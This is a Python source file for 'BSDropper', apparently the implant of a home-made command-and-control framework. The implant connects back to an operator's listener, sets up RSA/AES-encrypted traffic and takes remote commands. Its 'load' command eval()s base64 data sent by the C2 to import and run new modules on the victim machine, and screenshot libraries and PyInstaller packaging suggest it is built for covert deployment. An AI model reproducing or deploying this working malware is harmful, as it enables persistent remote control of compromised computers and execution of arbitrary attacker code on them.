#!/usr/bin/python3

import socket
import time
import queue
import re

#Pyinstaller imports
#(in hidden imports, here too to allow standalone python)
import os, sys, subprocess, PIL, pyscreenshot, packaging.requirements

from types import MethodType
from base64 import b64decode, b64encode
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util import Padding
from Crypto import Random

from common import importer
from common import bcolors as bc

class BSDropper():
    def __init__(self, LHOST, LPORT):
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.commands = {
            'terminate' : self.terminate,
            'load' : self.load,
            'REGISTER' : self.REGISTER,
            'CRYPTSETUP' : self.CRYPTSETUP,
            'ping' : self.ping
            }
        self.run_flag = True
        self.s = socket.socket()
        self.cmd = ''
        self.args = ''
        self.resp = ''
        self.retries = 10
        self.retry_wait = 5
        self.RSA_KEY = None
        self.AES_KEY = ''
        self.recv_buf = b''

    def run(self):
        #Retry connections a few times
        for i in range(self.retries):
            try:
                self.connect()
                bc.success("Connected")
                #i = self.retries
                break
            except Exception as e:
                bc.err("Could not connect:\n{}.".format(e))
                time.sleep(self.retry_wait)
                continue

        #Now connected, encrypt:
        bc.info("Setting up encryption")
        if not self.CRYPTSETUP():
            bc.err("Encryption setup failed. Exiting.")
            return

        #Main loop
        while self.run_flag:
            bc.info("Loop start - receiving")
            self.get_command()
            bc.blue_print("[-] ", "- Implant got: {} : {}".format(self.cmd, self.args))
            if self.cmd in self.commands:
                #if self.args:
                print("DEBUG - command {} is in the command list. Yay!".format(self.cmd))
                if self.args:
                    try:
                        self.commands[self.cmd](self.args)
                    except Exception as e:
                        self.send("ERROR Exception in Implant (with args) :\n{}".format(e))
                        self.cmd = ''
                else:
                    try:
                        self.commands[self.cmd]()
                    except Exception as e:
                        self.send("ERROR Exception in Implant :\n{}".format(e))
                        self.cmd = ''
            else:
                self.send('ERROR - Command not recognised: {}'.format(self.cmd + ' ' + self.args))
            bc.info("Command complete - main loop over.")


    def connect(self):
        self.s.connect((self.LHOST, self.LPORT))

    def recv(self, print_flag=True, debug=False, string=False):
        """Receive data from the C2, handles long messages until length <2048
                decrypts and returns everything as bytes or string as per string flag.
                now designed to get any network traffic and store in fifo, then do recv
                from fifo."""

        '''
        msg = b''
        while True:
            chunk = self.s.recv(2048)
            msg += chunk
            if len(chunk) < 2048:
                break
        #Decryption return either message, or False
        print("DEBUG - IV : {}".format(msg[:AES.block_size]))
        if string:
            return self.decrypt(
                    msg[:AES.block_size], msg[AES.block_size:]).decode()
        else:
            return self.decrypt(
                msg[:AES.block_size], msg[AES.block_size:])
                '''
        #get traffic from network and append to recv_buffer
        while True:
            chunk = self.s.recv(2048)
            self.recv_buf += chunk
            if len(chunk) < 2048:
                break
        #parse recv buffer for next message
        #We should have a colon at position 1,
        #another after the 16 byte IV, then another somwhere else again
        if self.recv_buf.count(b':') < 3:
            bc.err("Error, didn't receive at least 1 complete message")
            return False
        elif self.recv_buf.find(b':')>0 and self.recv_buf.find(b':', 1) != AES.block_size + 1:
            bc.err("Receive buffer contains malformed messages!")
            return False
        else:
            #first col already at pos 0 from previous checks
            col1 = 0
            col2 = self.recv_buf.find(b':', 1 )
            col3 = self.recv_buf.find(b':', col2 +1 )
            message = self.recv_buf[:col3 + 1]
            self.recv_buf = self.recv_buf[col3 + 1:]     #Also remove the message from queue
            if debug:
                bc.info("Encrypted message : {}".format(message))
            IV = b64decode(message[ col1 + 1 : col2 ])
            ciphertext = b64decode(message[ col2 + 1 : col3 + 1 ])

        #Decryption return either message, or False
        if debug:
            bc.info("IV : {}".format(IV))
        if string:
            return self.decrypt(IV, ciphertext).decode()
        else:
            return self.decrypt(IV, ciphertext)
            '''
    def send(self, message, debug=False):
        if debug:
            print("DEBUG - Sending : {}".format(message))
        enc = self.encrypt(message)
        if enc:
            if debug:
                print("Message - {} IV : {}".format(message, enc[0]))
                bc.info("Message length : {}".format(len(b''.join(enc))))
            message = b':' + b':'.join([b64encode(i) for i in enc]) + b':'' #colon IV colon message, colon
            if message:
                self.s.sendall(message)  #Sendall instead
        else:
            bc.err("Encryption failed in repl function.")
        '''

    def send(self, message, debug=False):
        """Send string to C2, automatically encrypts the data and manages
                conversion of the data to bytes objects before sending."""
        if not message:
            bc.info("No mesasge to send. not sending.")
            return
        try:
            if debug:
                bc.info("Sending {} to {}.".format(message, str(self.name)))
            enc = self.encrypt(message)
            if enc:
                if debug:
                    print("Message - {} IV : {}".format(message, enc[0]))
                    bc.info("Message length : {}".format(len(b''.join(enc))))
                message = b':' + b':'.join([b64encode(i) for i in enc]) + b':' #colon IV colon message, colon
                if message:
                    self.s.sendall(message)  #Sendall instead
            else:
                bc.err("Encryption failed in repl function.")
        except BrokenPipeError as e:
            bc.err("Agent {} not responding. Terminating".format(self.name))
            self.terminate()
            bc.warn("Terminate failed, falling back on emergency method.")
            raise Exception("Agent {} dead.".format(self.name))
        except Exception as e:
            bc.err("Failed to send message: {}".format(e))

    def encrypt(self, message):
        if isinstance(message, str) and message != '':
            message = message.encode()
        if isinstance(message, bytes) and message != b'':
            IV = Random.new().read(AES.block_size)
            encryptor = AES.new(self.AES_KEY, AES.MODE_CBC, IV)
            padded_message = Padding.pad(message, AES.block_size)
            encrypted_message = encryptor.encrypt(padded_message)
            return (IV, encrypted_message)
        else:
            bc.err("Unsupported response format : {} len: {} type: {}".format(
                    message, len(message),type(message)))
            return False


    def decrypt(self, IV, message):
        print("DEBUG - Decrypting")
        if isinstance(message, str) and message != '':
            message = message.encode()
        if isinstance(message, bytes) and message != b'':
            #IV = cipher[:AES.block_size]
            decryptor = AES.new(self.AES_KEY, AES.MODE_CBC, IV)
            decrypted_padded_message = decryptor.decrypt(message)
            decrypted_message = Padding.unpad(
                    decrypted_padded_message, AES.block_size)
            return decrypted_message
        else:
            bc.err("Unsupported response format : {} len: {} type: {}".format(
                    message, len(message),type(message)))
            return False

    def get_command(self):
        recv_command = self.recv()
        if recv_command:
            recv_command = recv_command.decode().split(' ')
            self.cmd = recv_command[0]
            self.args = ' '.join(recv_command[1:])
        else:
            bc.err("Failed to get command from C2.")
            self.cmd = self.args = ''

            '''
    def old_repl(self):
        #print("DEBUG - Sending : {}".format(self.resp))
        enc = self.encrypt(self.resp)
        if enc:
            print("DEBUG - {} IV : {}".format(self.resp, enc[0]))
            print("DEBUG - message length : {}".format(len(b''.join(enc))))
            self.resp = b''.join(enc)
            if self.resp:
                self.s.sendall(self.resp)  #Sendall instead
                self.resp = ''
        else:
            bc.err("Encryption failed in repl function.")

    def old_recv(self):
        recv_command = b''
        while True:
            chunk = self.s.recv(2048)
            recv_command += chunk
            if len(chunk) < 2048:
                break
        #Encryption and listifying
        print("DEBUG - IV : {}".format(recv_command[:AES.block_size]))
        recv_command = self.decrypt(
                recv_command[:AES.block_size], recv_command[AES.block_size:])
        #recv_command = self.decrypt(
        #        recv_command[:recv_command.find(b':')], recv_command[recv_command.find(b':'):])
        if recv_command:
            recv_command = recv_command.decode().split(' ')
            self.cmd = recv_command[0]
            self.args = ' '.join(recv_command[1:])
        else:
            bc.err("Decryption failed in receive function")
            self.cmd = self.args = ''
            '''

    def CRYPTSETUP(self, args=None):
        try:
            self.RSA_KEY = RSA.generate(2048)
            pub_key = self.RSA_KEY.publickey().exportKey()
            print("DEBUG - generated public key : {}".format(pub_key))
            #WE can't use builtin resp() yet because no crypto
            self.s.send(b64encode(pub_key))
            enc_AES = self.s.recv(1024)
            decryptor = PKCS1_OAEP.new(self.RSA_KEY)
            self.AES_KEY = decryptor.decrypt(b64decode(enc_AES))
            bc.success("Got AES Key : {}".format(self.AES_KEY))
            #Destroy RSA Key
            del(self.RSA_KEY)
            bc.info("Sending success message!")
            self.send("success")
            resp = self.recv(string=True)
            bc.info("Got success message back off C2, now to test it.")
            if "success" in resp:
                bc.success("Cryptsetup success!!")
                return True
            else:
                bc.err("Crypto setup failed, response: {}".format(resp))
                raise ValueError("No success message received from listener")
        except Exception as e:
            bc.err("Exception setting up crypto : {}.".format(e))
            return False


    def REGISTER(self, args=None):
        self.name = args
        self.send('Registered Impant as {}'.format(self.name))

    def load(self, args=None):
        try:
            import_dict = eval(b64decode(args))
            bc.blue_print("[-] ", "Import dic evaluated fine : {}\n:{}".format(type(import_dict), import_dict))
            mod, funcs = importer.bs_import(import_dict)
            bc.blue_print("[-] ","Loading : {} with funcs:\n{}".format(mod, funcs))
            setattr(self, mod.__name__ , MethodType(mod.main, self))
            print("Registered {} as {}.".format(mod.__name__, mod.main))
            self.commands[mod.__name__] = getattr(self, mod.__name__)
            print("Load complete, setting response")
            self.send('Successfully Loaded : {}.'.format(mod.__name__))
        except Exception as e:
            bc.err_print("[!] ", "- Exception when loading module : {}".format(e))
            self.send('Load Failed for : {}'.format(args))

    def ping(self, args=None):
        if not args:
            self.send("PONG")
        else:
            self.send('PONG ' + args)

    def terminate(self, args=None):
        bc.info("Terminating!")
        self.s.close()
        self.run_flag = False
        self.resp = None


def main(host = 'localhost', port = 8888):
    a = BSDropper(host, port)
    a.run()

if __name__ == '__main__':
    main()
